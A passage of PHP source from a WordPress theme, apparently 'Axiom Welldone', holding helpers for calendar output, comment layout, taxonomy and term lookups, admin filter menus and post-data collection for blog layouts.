				$calendar_output .= '<a class="day_wrap" href="' . esc_url(!empty($posts[$day]['link']) ? $posts[$day]['link'] : get_day_link($thisyear, $thismonth, $day)) . '" title="' . esc_attr( is_int($posts[$day]['titles']) ? $posts[$day]['titles'].' '.esc_html__('items', 'axiom-welldone') : $posts[$day]['titles'] ) . "\">$day</a>";
			else
				$calendar_output .= '<span class="day_wrap">'.($day).'</span>';
			$calendar_output .= '</td>';
	
			if ( 6 == calendar_week_mod(date('w', mktime(0, 0 , 0, $thismonth, $day, $thisyear))-$week_begins) )
				$newrow = true;
		}
	
		$pad = 7 - calendar_week_mod(date('w', mktime(0, 0 , 0, $thismonth, $day, $thisyear))-$week_begins);
		if ( $pad != 0 && $pad != 7 )
			$calendar_output .= '<td class="pad" colspan="'. esc_attr($pad) .'"><span class="day_wrap">&nbsp;</span></td>';
	
		$calendar_output .= "</tr></tbody></table>";

		return $calendar_output;
	}
}

// Calendar change month
if ( !function_exists( 'axiom_welldone_callback_calendar_change_month' ) ) {
	function axiom_welldone_callback_calendar_change_month() {
		
		if ( !wp_verify_nonce( axiom_welldone_get_value_gp('nonce'), admin_url('admin-ajax.php') ) )
			die();
	
		$m = (int) $_REQUEST['month'];
		$y = (int) $_REQUEST['year'];
		$pt = $_REQUEST['post_type'];

		$response = array('error'=>'', 'data'=>axiom_welldone_get_calendar(false, $m, $y, array('post_type'=>$pt)));

		echo json_encode($response);
		die();
	}
}


// Callback for output single comment layout
if (!function_exists('axiom_welldone_output_single_comment')) {
	function axiom_welldone_output_single_comment( $comment, $args, $depth ) {
		$GLOBALS['comment'] = $comment;
		switch ( $comment->comment_type ) {
			case 'pingback' :
				?>
				<li class="trackback"><?php esc_html_e( 'Trackback:', 'axiom-welldone' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( esc_html__( 'Edit', 'axiom-welldone' ), '<span class="edit-link">', '<span>' ); ?>
				<?php
				break;
			case 'trackback' :
				?>
				<li class="pingback"><?php esc_html_e( 'Pingback:', 'axiom-welldone' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( esc_html__( 'Edit', 'axiom-welldone' ), '<span class="edit-link">', '<span>' ); ?>
				<?php
				break;
			default :
				$author_id = $comment->user_id;
				$author_link = get_author_posts_url( $author_id );
				$mult = axiom_welldone_get_retina_multiplier();
				?>
				<li id="comment-<?php comment_ID(); ?>" <?php comment_class('comment_item'); ?>>
					<div class="comment_author_avatar"><?php echo get_avatar( $comment, 75*$mult ); ?></div>
					<div class="comment_content">
						<div class="comment_info">
							<span class="comment_author"><?php echo (!empty($author_id) ? '<a href="'.esc_url($author_link).'">' : '') . comment_author() . (!empty($author_id) ? '</a>' : ''); ?></span>
							<span class="comment_date"><span class="comment_date_label"><?php esc_html_e('Posted', 'axiom-welldone'); ?></span> <span class="comment_date_value"><?php echo get_comment_date(get_option('date_format')); ?></span></span>
							<span class="comment_time"><?php echo get_comment_date(get_option('time_format')); ?></span>
						</div>
						<div class="comment_text_wrap">
							<?php if ( $comment->comment_approved == 0 ) { ?>
							<div class="comment_not_approved"><?php esc_html_e( 'Your comment is awaiting moderation.', 'axiom-welldone' ); ?></div>
							<?php } ?>
							<div class="comment_text"><?php comment_text(); ?></div>
						</div>
						<?php if ($depth < $args['max_depth']) { ?>
							<div class="comment_reply"><?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?></div>
						<?php } ?>
					</div>
				<?php
				break;
		}
	}
}




	
/* Blog utils
------------------------------------------------------------------------------------- */
	
// Return ID for the page with specified template
if (!function_exists('axiom_welldone_get_template_page_id')) {
	function axiom_welldone_get_template_page_id($name) {
		$pages = get_pages(array(
			'meta_key' => '_wp_page_template',
			'meta_value' => $name . '.php',
			'child_of' => 0,
			'parent' => -1,
			'number' => 1,
			'offset' => 0,
			'post_type' => 'page',
			'post_status' => 'publish'
			)
		); 
		return is_array($pages) && !empty($pages[0]->ID) ? $pages[0]->ID : 0;
	}
}
	
// Detect current mode and return correspond template page ID
if (!function_exists('axiom_welldone_detect_template_page_id')) {
	function axiom_welldone_detect_template_page_id($key='') {
		static $template_id = '';
		if (!empty($template_id)) return $template_id;
		if (empty($key)) $key = axiom_welldone_detect_inheritance_key();
		$tmp = '';
		if (!empty($key)) {
			$inheritance = axiom_welldone_get_theme_inheritance($key);
			if (is_singular() && !axiom_welldone_storage_get('blog_streampage') && axiom_welldone_strpos(axiom_welldone_storage_get('page_template'), 'blog-')===false && !empty($inheritance['single_template'])) {
				$tmp = axiom_welldone_get_template_page_id($inheritance['single_template']);
			}
			if ((!is_singular() || !$tmp) && !empty($inheritance['stream_template'])) {
				$tmp = axiom_welldone_get_template_page_id($inheritance['stream_template']);
			}
		}
		if (empty($tmp)) $tmp = apply_filters('axiom_welldone_filter_detect_template_page_id', 0, $key);
		if (axiom_welldone_storage_empty('pre_query')) $template_id = $tmp;
		return $tmp;
	}
}
	
// Detect current mode template slug
if (!function_exists('axiom_welldone_detect_template_slug')) {
	function axiom_welldone_detect_template_slug($key='') {
		static $template_slug = '';
		if (!empty($template_slug)) return $template_slug;
		if (empty($key)) $key = axiom_welldone_detect_inheritance_key();
		$tmp = '';
		if (!empty($key)) {
			$inheritance = axiom_welldone_get_theme_inheritance($key);
			if (is_singular() && !axiom_welldone_storage_get('blog_streampage') && axiom_welldone_strpos(axiom_welldone_storage_get('page_template'), 'blog-')===false && !empty($inheritance['single_template'])) {
				$tmp = axiom_welldone_get_slug($inheritance['single_template']);
			}
			if ((!is_singular() || !$tmp) && !empty($inheritance['stream_template'])) {
				$tmp = axiom_welldone_get_slug($inheritance['stream_template']);
			}
		}
		if (empty($tmp)) $tmp = apply_filters('axiom_welldone_filter_detect_template_slug', '', $key);
		if (empty($tmp)) $tmp = $key;
		if (axiom_welldone_storage_empty('pre_query')) $template_slug = $tmp;
		return $tmp;
	}
}
	
// Return slug for the specified template
if (!function_exists('axiom_welldone_get_template_slug')) {
	function axiom_welldone_get_template_slug($key) {
		$template_slug = '';
		$inheritance = axiom_welldone_get_theme_inheritance($key);
		if (is_singular() && !axiom_welldone_storage_get('blog_streampage') && !empty($inheritance['single_template'])) {
			$template_slug = axiom_welldone_get_slug($inheritance['single_template']);
		}
		if ((!is_singular() || !$template_slug) && !empty($inheritance['stream_template'])) {
			$template_slug = axiom_welldone_get_slug($inheritance['stream_template']);
		}
		if (empty($template_slug)) $template_slug = $key;
		return $template_slug;
	}
}
	
// Return ID of the stream page for specified mode
if (!function_exists('axiom_welldone_get_stream_page_id')) {
	function axiom_welldone_get_stream_page_id($mode) {
		return apply_filters('axiom_welldone_filter_get_stream_page_id', '', $mode);
	}
}
	
// Return link to the stream page for specified mode
if (!function_exists('axiom_welldone_get_stream_page_link')) {
	function axiom_welldone_get_stream_page_link($mode) {
		return apply_filters('axiom_welldone_filter_get_stream_page_link', '', $mode);
	}
}
	
// Return title of the stream page for specified mode
if (!function_exists('axiom_welldone_get_stream_page_title')) {
	function axiom_welldone_get_stream_page_title($mode) {
		return apply_filters('axiom_welldone_filter_get_stream_page_title', '', $mode);
	}
}

// Return taxonomy name (slug) if current page is this taxonomy page
if ( !function_exists( 'axiom_welldone_is_taxonomy' ) ) {
	function axiom_welldone_is_taxonomy($query=null) {
		static $tax = '';
		if (!empty($tax)) return $tax;
		$tax = apply_filters('axiom_welldone_filter_is_taxonomy',	$tax);
		if (!empty($tax)) return $tax;
		if ($query && $query->is_category() || is_category())
			$tax = 'category';
		else if ($query && $query->is_tag() || is_tag())
			$tax = 'post_tag';
		return $tax;
	}
}

// Return taxonomy term if current page is this taxonomy page
if ( !function_exists( 'axiom_welldone_get_current_term' ) ) {
	function axiom_welldone_get_current_term($tax='') {
		static $term = null;
		if (!empty($term)) return $term;
		if (empty($tax)) return null;
		if ($tax == 'category' ) {
			$cat_id = (int) get_query_var( 'cat' );
			if (empty($cat_id)) $cat_id = get_query_var( 'category_name' );
			$term = get_term_by( (int) $cat_id > 0 ? 'id' : 'slug', $cat_id, 'category', OBJECT);
		} else {
			$term = get_term_by( 'slug', get_query_var( $tax ), $tax, OBJECT);
		}
		return $term;
	}
}

// Get taxonomies terms by post id
if (!function_exists('axiom_welldone_get_terms_by_post_id')) {
	function axiom_welldone_get_terms_by_post_id($args=array()) {
		$args = array_merge(array(
			'post_id' 	=> 0,
			'taxonomy' 	=> array(),
			'parent_id'	=> 0,
			'exclude'	=> array(),
		), is_array($args) ? $args : array('post_id'=>$args));
		global $wp_query;
		if (!$args['post_id']) $args['post_id'] = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		if (!is_array($args['taxonomy'])) $args['taxonomy'] = array($args['taxonomy']);
		$post_type = get_post_type($args['post_id']);
		$taxonomies = get_object_taxonomies( $post_type, 'objects' );
		// get method for the parent term detection
		$closest_method = axiom_welldone_get_theme_option('close_category');
		// make terms list
		$terms_list = array();
		if (is_array($taxonomies) && count($taxonomies) > 0) {
			foreach ($taxonomies as $taxonomy_slug => $taxonomy_obj) {
				if (count($args['taxonomy'])>0 && !in_array($taxonomy_slug, $args['taxonomy'])) continue;
				// get the terms related to post
				// use it instead get_the_term_list() - return html string with terms
				if (false) $terms = get_the_term_list($args['post_id'], $taxonomy_slug);
				$terms = get_the_terms( $args['post_id'], $taxonomy_slug );
				if (!empty($terms) && is_array($terms)) {
					$terms_list[$taxonomy_slug] = $taxonomy_obj;
					$terms_list[$taxonomy_slug]->closest_parent = false;
					$terms_list[$taxonomy_slug]->terms			= array();
					$terms_list[$taxonomy_slug]->terms_ids		= array();
					$terms_list[$taxonomy_slug]->terms_slugs	= array();
					$terms_list[$taxonomy_slug]->terms_links	= array();
					foreach ( $terms as $term ) {
						if ($taxonomy_slug=='category' && in_array($term->term_id, $args['exclude'])) continue;
						$term->link = get_term_link( $term->slug, $taxonomy_slug );
						$terms_list[$taxonomy_slug]->terms[]		= $term; 
						$terms_list[$taxonomy_slug]->terms_ids[] 	= $term->term_id;
						$terms_list[$taxonomy_slug]->terms_slugs[]	= $term->slug;
						$terms_list[$taxonomy_slug]->terms_links[]	= '<a class="'.esc_attr($taxonomy_slug).'_link" href="'.get_term_link($term->slug, $taxonomy_slug).'">'.($term->name).'</a>';
						if ($taxonomy_obj->hierarchical && empty($terms_list[$taxonomy_slug]->closest_parent)) {
							$terms_list[$taxonomy_slug]->closest_parent = $closest_method == 'parental' ? axiom_welldone_get_parent_taxonomy($term->term_id, $args['parent_id'], $taxonomy_slug) : $term;
							if (!empty($terms_list[$taxonomy_slug]->closest_parent->slug))
								$terms_list[$taxonomy_slug]->closest_parent->link = get_term_link( $terms_list[$taxonomy_slug]->closest_parent->slug, $terms_list[$taxonomy_slug]->closest_parent->taxonomy );
						}
					}
					if (!$terms_list[$taxonomy_slug]->closest_parent && !empty($terms_list[$taxonomy_slug]->terms)) {
						$terms_list[$taxonomy_slug]->closest_parent = $terms_list[$taxonomy_slug]->terms[0];
					}					
				}
				if (count($args['taxonomy'])>0 && in_array($taxonomy_slug, $args['taxonomy'])) break;
			}
		}
		return $terms_list;
	}
}

// Return categories objects by post id
if (!function_exists('axiom_welldone_get_categories_by_post_id')) {
	function axiom_welldone_get_categories_by_post_id($args = array()) {
		if (!is_array($args)) $args = array('post_id' => $args);
		if (!isset($args['taxonomy'])) $args['taxonomy'] = 'category';
		return axiom_welldone_get_terms_by_post_id($args);
	}
}

// Return tags objects by post id
if (!function_exists('axiom_welldone_get_tags_by_post_id')) {
	function axiom_welldone_get_tags_by_post_id($args = array()) {
		if (!is_array($args)) $args = array('post_id' => $args);
		if (!isset($args['taxonomy'])) $args['taxonomy'] = 'post_tag';
		return axiom_welldone_get_terms_by_post_id($args);
	}
}


// Return terms objects by taxonomy name
if (!function_exists('axiom_welldone_get_terms_by_taxonomy')) {
	function axiom_welldone_get_terms_by_taxonomy($tax_types = 'post_format', $args=array()) {
		if (!is_array($tax_types)) $tax_types = array($tax_types);
		$terms = get_terms($tax_types, $args);
		if (is_array($terms) && count($terms) > 0) {
			foreach ($terms as $k=>$v)
				$terms[$k]->link = get_term_link($v->slug, $v->taxonomy);
		}
		return $terms;
	}
}

// Return terms objects by taxonomy name (directly from db)
if (!function_exists('axiom_welldone_get_terms_by_taxonomy_from_db')) {
	function axiom_welldone_get_terms_by_taxonomy_from_db($tax_types = 'post_format') {
		global $wpdb;
		if (!is_array($tax_types)) $tax_types = array($tax_types);
		$terms = $wpdb->get_results( $wpdb->prepare(
												"SELECT DISTINCT terms.*, tax.taxonomy, tax.parent, tax.count"
														. " FROM {$wpdb->terms} AS terms"
														. " LEFT JOIN {$wpdb->term_taxonomy} AS tax ON tax.term_id=terms.term_id"
														. " WHERE tax.taxonomy IN ('" . join(",", array_fill(0, count($tax_types), '%s')) . "')"
														. " ORDER BY terms.name",
												$tax_types
												),
									OBJECT
									);
		for ($i=0; $i<count($terms); $i++) {
			$terms[$i]->link = get_term_link($terms[$i]->slug, $terms[$i]->taxonomy);
		}
		return $terms;
	}
}

// Return id closest taxonomy to specified parent
if (!function_exists('axiom_welldone_get_parent_taxonomy')) {
	function axiom_welldone_get_parent_taxonomy($id, $parent_id=0, $taxonomy='category') {
		$val = null;
		do {
			$tax = get_term_by( 'id', $id, $taxonomy, OBJECT);
			if (empty($tax->parent) || $tax->parent==$parent_id) {
				$val = $tax;
				$val->link = get_term_link($val->slug, $val->taxonomy);
				break;
			}
			$id = $tax->parent;
		} while ($id);
		return $val;
	}
}

// Return id closest category to specified parent
if (!function_exists('axiom_welldone_get_parent_category')) {
	function axiom_welldone_get_parent_category($id, $parent_id=0) {
		return axiom_welldone_get_parent_taxonomy($id, $parent_id, 'category');
	}
}

// Return id nearest (or highest) parent taxonomy with specified property in array values
if (!function_exists('axiom_welldone_get_parent_taxonomy_by_property')) {
	function axiom_welldone_get_parent_taxonomy_by_property($id, $prop, $values, $highest=true, $taxonomy='category') {
		if ((int) $id == 0) {
			$tax = get_term_by( 'slug', $id, $taxonomy, OBJECT);
			$id = $tax->term_id;
		}
		if (!is_array($values)) $values = array($values);
		$val = $id;
		do {
			if ($props = axiom_welldone_taxonomy_load_custom_options($id, $taxonomy)) {
				if (isset($props[$prop]) && !empty($props[$prop]) && in_array($props[$prop], $values)) {
					$val = $id;
					if (!$highest) break;
				}
			}
			$tax = get_term_by( 'id', $id, $taxonomy, OBJECT);
			$id = $tax->parent;
		} while ($id);
		return $val;
	}
}

// Return id nearest (or highest) parent category with specified property in array values
if (!function_exists('axiom_welldone_get_parent_category_by_property')) {
	function axiom_welldone_get_parent_category_by_property($id, $prop, $values, $highest=true) {
		return axiom_welldone_get_parent_taxonomy_by_property($id, $prop, $values, $highest, 'category');
	}
}

// Show categories, tags, post-formats filters for posts and attachments
if ( !function_exists( 'axiom_welldone_show_taxonomies_filters' ) ) {
	function axiom_welldone_show_taxonomies_filters() {
		if (axiom_welldone_get_theme_option('admin_add_filters')!='yes') return;
		$page = get_query_var('post_type');
		if ($page == 'post')
			$taxes = array('post_format', 'post_tag');
		else if ($page == 'attachment')
			$taxes = array('media_folder');
		else
			return;
		axiom_welldone_show_layout(axiom_welldone_get_terms_filters($taxes));
	}
}

// Return string with <select> tags for each taxonomy
if (!function_exists('axiom_welldone_get_terms_filters')) {
	function axiom_welldone_get_terms_filters($taxes) {
		$output = '';
		if (is_array($taxes) && count($taxes) > 0) {
			foreach ($taxes as $tax) {
				$list = get_transient("axiom_welldone_terms_filter_".($tax));
				if (!$list) {
					$list = '';
					$tax_obj = get_taxonomy($tax);
					$terms = axiom_welldone_get_terms_hierarchical_list(axiom_welldone_get_terms_by_taxonomy($tax));
					if (is_array($terms) && count($terms) > 0) {
						$tax_slug = str_replace(array('post_tag'), array('tag'), $tax);
						$list .= "<select name='$tax_slug' id='$tax_slug' class='postform'>"
								.  "<option value=''>" . esc_html($tax_obj->labels->all_items) . "</option>";
						foreach ($terms as $slug=>$name) {
							$list .= '<option value='. esc_attr($slug) . (isset($_REQUEST[$tax_slug]) && $_REQUEST[$tax_slug] == $slug || (isset($_REQUEST['taxonomy']) && $_REQUEST['taxonomy'] == $tax_slug && isset($_REQUEST['term']) && $_REQUEST['term'] == $slug) ? ' selected="selected"' : '') . '>' . esc_html($name) . '</option>';
						}
						$list .=  "</select>";
					}
				}
				set_transient("axiom_welldone_terms_filter_".($tax), $list, 0);
				$output .= $list;
			}
		}
		return $output;
	}
}

// Return terms list as hierarchical array
if (!function_exists('axiom_welldone_get_terms_hierarchical_list')) {
	function axiom_welldone_get_terms_hierarchical_list($terms, $opt=array()) {
		$opt = array_merge(array(
			'prefix_key' => '',
			'prefix_level' => '&nbsp;',
			'parent' => 0,
			'level' => ''
			), $opt);
		$rez = array();
		if (is_array($terms) && count($terms) > 0) {
			foreach ($terms as $term) {
				if ((is_object($term) ? $term->parent : $term['parent'])!=$opt['parent']) continue;
				$slug = is_object($term) ? $term->slug : $term['slug'];
				$name = is_object($term) ? $term->name : $term['name'];
				$count = is_object($term) ? $term->count : $term['count'];
				$rez[$opt['prefix_key'].($slug)] = ($opt['level'] ? $opt['level'].' ' : '').($name).($count ? ' ('.($count).')' : '');
				$rez = array_merge($rez, axiom_welldone_get_terms_hierarchical_list($terms, array(
					'prefix_key' => $opt['prefix_key'],
					'prefix_level' => $opt['prefix_level'],
					'parent' => is_object($term) ? $term->term_id : $term['term_id'],
					'level' => ($opt['level']) . ($opt['prefix_level'])
					)
				));
			}
		}
		return $rez;
	}
}

// Save or delete post - clear all stored terms filters
if ( !function_exists( 'axiom_welldone_clear_all_terms_filters' ) ) {
	function axiom_welldone_clear_all_terms_filters($post_id=0, $post_obj=null) {
		delete_transient("axiom_welldone_terms_filter_category");
		delete_transient("axiom_welldone_terms_filter_post_tag");
		delete_transient("axiom_welldone_terms_filter_post_format");
	}
}

// Create, edit or delete category - clear stored categories
if ( !function_exists( 'axiom_welldone_clear_categories_filters' ) ) {
	function axiom_welldone_clear_categories_filters($term_id=0) {
		delete_transient("axiom_welldone_terms_filter_category");
	}
}



	
/* Show posts layout
------------------------------------------------------------------------------------- */

// Return merged parameters for show_post_layout() and get_post_data()
if (!function_exists('axiom_welldone_get_post_data_options')) {
	function axiom_welldone_get_post_data_options($opt) {
		$opt = array_merge(array(
			'layout' => '',				// Layout name - used to include layout file 'templates/xxx.php'
			'show' => true,				// Show layout into browser or return it as string
			'number' => 1,				// Post's number to detect even/odd and first/last classes
			'reviews' => true,			// Include Reviews marks into output array
			'counters' => axiom_welldone_get_custom_option("blog_counters"),	// What counters use: views or comments
			'add_view_more' => false,	// Add "View more" link at end of the description
			'posts_on_page' => 1,		// How many posts queried
			'columns_count' => 3,		// How many posts output in one row
			'hover' => 'square effect_dir',	// Hover effect
			'hover_dir' => 'left_to_right',	// Hover direction
			'info' => true,				// Show info block in the layout
			'date_format' => '',		// PHP rule for date output. Can be split on two parts with sign '+'. For example: 'd M+Y' 
										// In the output array post_date="31 May 2014", post_date_part1="31 May", post_date_part2="2014"
			// Parameters for get_post_data()
			'sidebar' => !axiom_welldone_param_is_off(axiom_welldone_get_custom_option('show_sidebar_main')),	// Sidebar is visible on current page
			'readmore' => null,			// Text for the "Read more" link
			'strip_teaser' => axiom_welldone_get_custom_option('show_text_before_readmore')!='yes',	// Strip text before <!--more--> tag in the content or show full content
			'substitute_gallery' => axiom_welldone_get_custom_option('substitute_gallery')=='yes',	// Substitute standard WP gallery on theme slider
			'substitute_video'   => axiom_welldone_get_custom_option('substitute_video')=='yes',		// Substitute tag <video> on the Youtube or Vimeo player
			'substitute_audio'   => axiom_welldone_get_custom_option('substitute_audio')=='yes',		// Substitute tag <audio> on the Sound Cloud's player
			'parent_tax_id' => 0,		// Now showed category ID: if in the theme options 'close_category'='parental' - we detect closest category to this ID for each post
			'dedicated' => '',			// Dedicated content from the post (created with shortcode [trx_section dedicated="yes"]...[/trx_section]
			'location' => '',			// Location of the dedicated content or featured image: left|right|top
			'post_class' => '',			// Class for location above (used in the <div> or <article> with this post
			'content' => false,			// Do you need prepare full content for this post (do shortcodes, apply filters etc.) Usually need only for the single page
			'terms_list' => false		// Detect the full list of the post's terms (categories, tags, etc.)
		), $opt);
		if (empty($opt['layout'])) 
			$opt['layout'] = 'excerpt';
		return $opt;
	}
}

// Return post HTML-layout
if (!function_exists('axiom_welldone_show_post_layout')) {
	function axiom_welldone_show_post_layout($opt = array(), $post_data=null, $post_obj=null) {
		$opt = axiom_welldone_get_post_data_options($opt);
		// Collect standard output
		$layout = '';
		$func_name = axiom_welldone_get_template_function_name($opt['layout']);
		if (function_exists($func_name)) {
			if (!$opt['show']) ob_start();
			if ($post_data === null) {
				$post_data = axiom_welldone_get_post_data($opt, $post_obj);
			}
			$layout = $func_name($opt, $post_data);
			if (!$opt['show'])  {
				$layout = ob_get_contents();
				ob_end_clean();
			}
			axiom_welldone_clear_dedicated_content();
		}
		return $layout;
	}
}

// Return all post data as array
if (!function_exists('axiom_welldone_get_post_data')) {
	function axiom_welldone_get_post_data(&$opt, $post_obj=null) {
		$opt = axiom_welldone_get_post_data_options($opt);
		global $post, $wp_query;

		//$old_post = $cur_post = null;
		if ($post_obj != null) {
			$post = $post_obj; 
			setup_postdata($post);
		}
		//if (axiom_welldone_exists_wpml() && !empty($post) && is_object($post)) $cur_post = clone $post;
		$post_id = get_the_ID();
		$cached_post = axiom_welldone_storage_get('post_data_'.$post_id);		// Restore cached post data
		if (is_array($cached_post)) {
			$post_parent_id		= $cached_post['post_parent_id'];
			$post_type			= $cached_post['post_type'];
			$post_protected		= $cached_post['post_protected'];
			$post_format		= $cached_post['post_format'];
			$post_icon			= $cached_post['post_icon'];
			$post_flags			= $cached_post['post_flags'];
			$post_link			= $cached_post['post_link'];
			$post_comments_link	= $cached_post['post_comments_link'];
			$post_date_sql		= $cached_post['post_date_sql'];
			$post_date_stamp	= $cached_post['post_date_stamp'];
			$post_date			= $cached_post['post_date'];
		} else {
			$post_parent_id = wp_get_post_parent_id( $post_id );
			if ( !$post_parent_id ) $post_parent_id = 0;
			$post_type = get_post_type();
			$post_protected = post_password_required();
			$post_format = get_post_format();
			if (empty($post_format)) $post_format = 'standard';
			$post_icon = axiom_welldone_get_custom_option('icon', axiom_welldone_get_post_format_icon($post_format), $post_id, $post_type);	//!!!!! Get option from specified post
			$post_flags = array(
				'sticky' => is_sticky()
			);
			$post_link = get_permalink();
			$post_comments_link = get_comments_link();
			$post_date_sql = get_the_date('Y-m-d H:i:s');
			$post_date_stamp = get_the_date('U');
			$post_date = get_the_date();
		}
		if (!empty($opt['date_format'])) {
			$parts = explode('+', $opt['date_format']);
			$post_date_part1 = empty($parts[0]) ? '' : date($parts[0], $post_date_stamp);
			$post_date_part2 = empty($parts[1]) ? '' : date($parts[1], $post_date_stamp);
			if ( ($post_date_part1) . ($post_date_part2) != '' ) {
				$post_date = axiom_welldone_get_date_translations($post_date_part1 . (!empty($post_date_part2) ? ' '.trim($post_date_part2) : ''));
			}
		}
	
		$post_options_counters = $opt['counters'];
		$post_comments = $post_views = $post_likes = 0;
		if ($opt['counters']!='') {
			if (is_array($cached_post) && $cached_post['post_options_counters']!='') {
				$post_comments	= $cached_post['post_comments'];
				$post_views		= $cached_post['post_views'];
				$post_likes		= $cached_post['post_likes'];
			} else {
				$post_comments = get_comments_number();
				$post_views = axiom_welldone_get_post_views($post_id);
				$post_likes = axiom_welldone_get_post_likes($post_id);
			}
		}
		
		$post_options_reviews = $opt['reviews'];
		$post_reviews_author = $post_reviews_users = 0;
		if ($opt['reviews']) {
			if (is_array($cached_post) && $cached_post['post_options_reviews']) {
				$post_reviews_author	= $cached_post['post_reviews_author'];
				$post_reviews_users		= $cached_post['post_reviews_users'];
			} else {
				$post_reviews_author = axiom_welldone_reviews_marks_to_display(get_post_meta($post_id, axiom_welldone_storage_get('options_prefix').'_reviews_avg', true));
				$post_reviews_users  = axiom_welldone_reviews_marks_to_display(get_post_meta($post_id, axiom_welldone_storage_get('options_prefix').'_reviews_avg2', true));
			}
		}
		
		if (is_array($cached_post)) {
			$post_author		= $cached_post['post_author'];
			$post_author_link	= $cached_post['post_author_link'];
			$post_author_id		= $cached_post['post_author_id'];
			$post_author_url	= $cached_post['post_author_url'];
			$post_edit_enable	= $cached_post['post_edit_enable'];
			$post_delete_enable = $cached_post['post_delete_enable'];
		} else {
			$post_author = get_the_author();
			$post_author_link = get_the_author_link();
			$post_author_id = get_the_author_meta('ID');
			$post_author_url = get_author_posts_url($post_author_id, '');
		
			// Is user can edit and/or delete this post?
			$allow_editor = axiom_welldone_get_theme_option("allow_editor")=='yes';
			$post_edit_enable = $allow_editor && (
							($post_type=='post' && current_user_can('edit_posts', $post_id)) || 
							($post_type=='page' && current_user_can('edit_pages', $post_id))
							);
			$post_delete_enable = $allow_editor && (
							($post_type=='post' && current_user_can('delete_posts', $post_id)) || 
							($post_type=='page' && current_user_can('delete_pages', $post_id))
							);
		}
		
		// Post content
		if (is_array($cached_post)) {
			$post_content_original	= $cached_post['post_content_original'];
			$post_content_plain		= $cached_post['post_content_plain'];
		} else {
			global $more;
			$old_more = $more;
			$more = -1;
			$post_content_original = trim(chop($post->post_content));
			$post_content_plain = trim(chop(get_the_content()));
			$more = $old_more;
		}
		$post_content = trim(chop(get_the_content($opt['readmore'], $opt['strip_teaser'])));
		// Substitute WP [gallery] shortcode
		$thumb_sizes = axiom_welldone_get_thumb_sizes(array(
			'layout' => $opt['layout']
		));

		if ($opt['content']) {
			if (!empty($post_content) && $opt['substitute_gallery'] && !axiom_welldone_in_shortcode_blogger(true))	$post_content = axiom_welldone_substitute_gallery($post_content, $post_id, $thumb_sizes['w'], $thumb_sizes['h_crop'], true);
			if (!empty($post_content)) $post_content = apply_filters('the_content', $post_content);

			// Restore post data
			if ($post_id != get_the_ID()) {		// Fix bug in the WPML
				if ($post_obj != null) {
					$post = $post_obj; 
					setup_postdata($post);
				} else
					wp_reset_postdata();
			}

			if (!empty($post_content)) {
				if ($opt['substitute_video'] && !axiom_welldone_in_shortcode_blogger(true)) 	$post_content = axiom_welldone_substitute_video($post_content, $thumb_sizes['w'], $thumb_sizes['h_crop']);
				if ($opt['substitute_audio'] && !axiom_welldone_in_shortcode_blogger(true))	$post_content = axiom_welldone_substitute_audio($post_content);
			}
		}

		// Post excerpt
		if (is_array($cached_post)) {
			$post_excerpt_original	= $cached_post['post_excerpt_original'];
			$post_excerpt			= $cached_post['post_excerpt'];
		} else {
			$post_excerpt_original = $post->post_excerpt;
			$post_excerpt = has_excerpt() || $post_protected ? get_the_excerpt() : '';
			if (empty($post_excerpt)) {
				if (($more_pos = axiom_welldone_strpos($post_content_plain, '<span id="more-'))!==false) {
					$post_excerpt = axiom_welldone_substr($post_content_plain, 0, $more_pos);
				} else {
                    $post_excerpt = $post_id == 0
                        ? ''
                        : (in_array($post_format, array('quote', 'link'))
                            ? $post_content
                            : strip_shortcodes(strip_tags(get_the_excerpt())));
				}
			}
			if (!empty($post_excerpt) && $opt['substitute_gallery'] && !axiom_welldone_in_shortcode_blogger(true)) $post_excerpt = axiom_welldone_substitute_gallery($post_excerpt, $post_id, $thumb_sizes['w'], $thumb_sizes['h_crop']);
			if (!empty($post_excerpt)) $post_excerpt = apply_filters('axiom_welldone_filter_sc_clear_around', $post_excerpt);
			if (!empty($post_excerpt)) $post_excerpt = apply_filters('the_excerpt', $post_excerpt);
			if (!empty($post_excerpt)) {
				$post_excerpt = apply_filters('axiom_welldone_filter_p_clear_around', $post_excerpt);

				// Restore post data
				if ($post_id != get_the_ID()) {		// Fix bug in the WPML
					if ($post_obj != null) {
						$post = $post_obj; 
						setup_postdata($post);
					} else
						wp_reset_postdata();
				}
				if ($opt['substitute_video'] && !axiom_welldone_in_shortcode_blogger(true)) $post_excerpt = axiom_welldone_substitute_video($post_excerpt, $thumb_sizes['w'], $thumb_sizes['h_crop']);
				if ($opt['substitute_audio'] && !axiom_welldone_in_shortcode_blogger(true)) $post_excerpt = axiom_welldone_substitute_audio($post_excerpt);
				$post_excerpt = trim(chop(str_replace(array('[...]', '[&hellip;]'), array('', ''), $post_excerpt)));
			}
		}
		
		// Post Title
		if (is_array($cached_post)) {
			$post_title_plain	= $cached_post['post_title_plain'];
			$post_title			= $cached_post['post_title'];
		} else {
			$post_title = $post_title_plain = trim(chop(get_the_title()));
			if (!empty($post_title)) $post_title = apply_filters('the_title',   $post_title);

			// Restore post data
			if ($post_id != get_the_ID()) {		// Fix bug in the WPML
				if ($post_obj != null) {
					$post = $post_obj; 
					setup_postdata($post);
				} else
					wp_reset_postdata();
			}
		}
		
		// Prepare dedicated content
		$opt['dedicated'] = axiom_welldone_get_dedicated_content();
		$opt['location']  = !empty($opt['location']) ? $opt['location'] : axiom_welldone_get_custom_option('dedicated_location');
		if (empty($opt['location']) || $opt['location'] == 'default')
			$opt['location'] = axiom_welldone_get_custom_option('dedicated_location', '', $post_id, $post_type);	//!!!!! Get option from specified post
		if ($opt['location']=='alter' && !is_single() && (!is_page() || isset($wp_query->is_posts_page) && $wp_query->is_posts_page==1)) {
			$loc = array('right', 'left');	//, 'center'
			$opt['location'] = $loc[($opt['number']-1)%count($loc)];
		}
		if (!empty($opt['dedicated'])) {
			$class = axiom_welldone_get_tag_attrib($opt['dedicated'], '<div class="sc_section>', 'class');
			if ($opt['location']=='default') {
				if (($pos = axiom_welldone_strpos($class, 'sc_align'))!==false) {
					$pos += 8;
					$pos2 = axiom_welldone_strpos($class, ' ', $pos);
					$opt['location'] = $pos2===false ? axiom_welldone_substr($class, $pos) : axiom_welldone_substr($class, $pos, $pos2-$pos);
				}
				if ($opt['location']=='' || $opt['location']=='default') $opt['location'] = 'center';
			}
